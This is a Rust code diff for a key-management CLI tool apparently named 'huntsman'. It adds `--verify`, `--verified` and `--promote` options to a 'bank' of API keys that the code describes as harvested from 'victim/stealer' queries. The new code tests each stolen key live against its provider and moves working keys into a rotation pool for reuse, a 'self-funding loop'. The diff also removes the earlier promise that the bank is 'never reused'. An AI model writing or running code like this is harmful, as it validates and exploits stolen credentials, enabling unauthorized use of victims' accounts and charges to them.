@@ -7,9 +7,15 @@
 //!
 //! `bank` is different: it reads the persistent **retention bank**
 //! (`util::key_vault`, `~/.huntsman/key_vault.db`) — every API key ever found in
-//! a victim/stealer query, categorised and OSINT-providers-first. The bank is
-//! retention-only (never used to authenticate); it is the operator-facing view
-//! of harvested keys as OSINT intelligence.
+//! a victim/stealer query, categorised and OSINT-providers-first. The bank store
+//! itself is a catalogue (it is never read back to authenticate); it is the
+//! operator-facing view of harvested keys as OSINT intelligence.
+//!
+//! `bank --verify` confirms banked keys LIVE against their providers' real
+//! endpoints, recording each success as a *verified duplicate*
+//! (`verified_count`). `bank --verify --promote` then copies each newly-proven
+//! poolable key into the separate rotation pool (`list`/`status`) for reuse —
+//! the self-funding loop that turns harvested intelligence into live capacity.
 
 use clap::Subcommand;
 
@@ -121,6 +127,19 @@ pub enum KeysAction {
         /// Print a per-category OSINT-provider census instead of each key.
         #[arg(long)]
         census: bool,
+        /// Confirm banked keys LIVE against their providers' real endpoints,
+        /// recording each success as a verified duplicate (real execution — one
+        /// live request per key that has a known validator).
+        #[arg(long)]
+        verify: bool,
+        /// Show only keys already proven live (`verified_count >= 1`) — the
+        /// bank's verified-duplicate, self-funding capacity.
+        #[arg(long)]
+        verified: bool,
+        /// After a live `--verify` pass, promote each newly-confirmed poolable
+        /// key into the rotation pool for reuse (the self-funding loop).
+        #[arg(long)]
+        promote: bool,
     },
     /// List supported service names and their categories.
     Services,
@@ -414,6 +433,9 @@ pub(super) async fn cmd_keys(action: KeysAction) -> Result<()> {
             service,
             reveal,
             census,
+            verify,
+            verified,
+            promote,
         } => {
             use crate::util::key_vault;
 
@@ -445,6 +467,84 @@ pub(super) async fn cmd_keys(action: KeysAction) -> Result<()> {
                 let lower = s.to_lowercase();
                 entries.retain(|e| e.service.to_lowercase() == lower);
             }
+
+            // Live verification pass: confirm each banked key against its
+            // provider's REAL endpoint and record every success as a verified
+            // duplicate. Only keys whose service has a known validator are
+            // probed (one live request each); everything else is left untouched.
+            if verify {
+                let candidates: Vec<(String, String)> = entries
+                    .iter()
+                    .filter(|e| key_pool::find_service(&e.service).is_some())
+                    .map(|e| (e.service.clone(), e.key_value.clone()))
+                    .collect();
+                if candidates.is_empty() {
+                    println!("No banked keys have a live validator — nothing to verify.\n");
+                } else {
+                    println!(
+                        "Verifying {} banked key(s) against live endpoints…",
+                        candidates.len()
+                    );
+                    let mut confirmed = 0u32;
+                    let mut promoted = 0u32;
+                    for (svc, value) in &candidates {
+                        match key_pool::validate_key(svc, value).await {
+                            Some(true) => {
+                                let _ = key_vault::record_verification(value);
+                                confirmed += 1;
+                                println!("  {svc}: {} LIVE ✓", char_prefix(value, 8));
+                                // Self-funding loop: a proven, poolable key becomes
+                                // reusable rotation capacity.
+                                if promote && crate::util::service_defs::is_poolable_service(svc) {
+                                    let mut entry = KeyEntry::new(value);
+                                    entry.status = KeyStatus::Active;
+                                    entry.last_validated = Some(crate::core::entity::unix_now());
+                                    entry.discovered_by = Some("key_vault:verified".to_string());
+                                    entry.discovered_at = Some(crate::core::entity::unix_now());
+                                    entry.notes =
+                                        Some("Promoted from bank after live confirmation".into());
+                                    if pool.add(svc, entry) {
+                                        promoted += 1;
+                                    }
+                                }
+                            }
+                            Some(false) => {
+                                println!("  {svc}: {} invalid", char_prefix(value, 8));
+                            }
+                            None => {}
+                        }
+                    }
+                    if promoted > 0 {
+                        key_pool::save_pool(&pool)
+                            .map_err(|e| Error::Other(format!("save pool: {e}")))?;
+                    }
+                    println!(
+                        "\nVerified {confirmed}/{} key(s) live{}.\n",
+                        candidates.len(),
+                        if promote {
+                            format!(", promoted {promoted} into the rotation pool")
+                        } else {
+                            String::new()
+                        }
+                    );
+                    // Re-read so the rendered rows reflect the freshly-recorded
+                    // verified counts.
+                    entries = if osint {
+                        key_vault::osint_entries()
+                    } else {
+                        key_vault::all_entries()
+                    };
+                    if let Some(ref s) = service {
+                        let lower = s.to_lowercase();
+                        entries.retain(|e| e.service.to_lowercase() == lower);
+                    }
+                }
+            }
+
+            // `--verified`: restrict the view to proven-live capacity.
+            if verified {
+                entries.retain(crate::util::key_vault::VaultEntry::is_verified);
+            }
             // Full list: OSINT providers first, then by category / frequency.
             if !osint {
                 entries.sort_by(|a, b| {
@@ -463,20 +563,22 @@ pub(super) async fn cmd_keys(action: KeysAction) -> Result<()> {
             }
 
             let osint_n = entries.iter().filter(|e| e.is_osint()).count();
+            let verified_n = entries.iter().filter(|e| e.is_verified()).count();
             if reveal {
                 eprintln!(
                     "# WARNING: --reveal prints PLAINTEXT keys. Treat the output as a secret."
                 );
             }
             println!(
-                "BANK — {} retained key(s), {osint_n} OSINT-provider (★). Retention-only; never reused.\n",
+                "BANK — {} retained key(s), {osint_n} OSINT-provider (★), {verified_n} proven live (✓). \
+                 Retention catalogue; promote with `--verify --promote`.\n",
                 entries.len()
             );
             println!(
-                "{:<2} {:<20} {:<18} {:<24} {:<9} SOURCE",
-                "", "CATEGORY", "SERVICE", "KEY", "SEEN"
+                "{:<2} {:<20} {:<18} {:<24} {:<7} {:<9} SOURCE",
+                "", "CATEGORY", "SERVICE", "KEY", "SEEN", "VERIFIED"
             );
-            println!("{}", "-".repeat(86));
+            println!("{}", "-".repeat(95));
             for e in &entries {
                 println!("{}", bank_row(e, reveal));
             }
@@ -646,8 +748,15 @@ fn bank_row(e: &crate::util::key_vault::VaultEntry, reveal: bool) -> String {
     } else {
         mask_key(&e.key_value)
     };
+    // VERIFIED column: a live-confirmed key shows `✓×N` (its verified-duplicate
+    // count); an unverified key shows `-`.
+    let ver = if e.is_verified() {
+        format!("✓×{}", e.verified_count)
+    } else {
+        "-".to_string()
+    };
     format!(
-        "{mark:<2} {cat:<20} {svc:<18} {key:<24} {seen:<9} {prov}",
+        "{mark:<2} {cat:<20} {svc:<18} {key:<24} {seen:<7} {ver:<9} {prov}",
         svc = e.service,
         seen = format!("×{}", e.discovery_count),
         prov = e.provider,
